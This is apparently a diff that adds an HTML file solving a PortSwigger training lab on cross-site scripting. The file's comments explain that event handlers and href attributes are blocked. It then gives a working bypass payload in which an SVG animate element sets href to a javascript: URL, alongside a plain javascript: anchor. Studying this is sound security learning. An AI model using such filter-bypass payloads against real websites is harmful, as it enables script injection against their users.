@@ -1,0 +1,36 @@
+<!-- 
+    link to the lab: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked
+    2 way to run javascript in html: 
+        +) from event
+            ex: <button onclick="location.href='URl'"
+        +) from anchor tag 
+            ex: <a href="javascript:location.href='URl'">URL</a>"
+    But the first way was blocked by the server
+    And after running the script check_tags_events, we found out that there are some tags allowed by server 
+    Which are: <a>, <image>, <animate>, <title> and <svg>
+-->
+
+<!-- to trigger an alert with anchor tag html, we do: -->
+<a href="javascript:alert('XSS vuln')"> Click me </a> <br><br><br> 
+
+<!-- 
+    so to solve the lab, we need to know that tag <svg> allow us to use other html tags
+    we try to put an anchor tag inside the <svg> tag: <svg> <a href="javascript:alert(123)"></a> </svg>
+    but as we have already known that href attributes was blocked, so we need to try anotherway
+    we gonna use <animate> tag to assign attribute and it's value to the element that contains this tag
+    and in order to include simulated lab user to click our vector, we need to add the word "Click" to the <svg> tag
+    but we cannot use plain text in the <svg> tag, so we try <text> in search bar and find out that <text> tag is usable
+-->
+
+<svg>
+    
+    <a>
+        
+        <animate attributename="href" values="javascript:alert('XSS vuln')"></animate>        
+        <text x="20" y="20">Click</text>
+
+    </a>
+    
+</svg>
+
+<!-- this is an example of how to use the svg tag and passively use an attribute: https://developer.mozilla.org/en-US/docs/Web/SVG/Element/animate -->
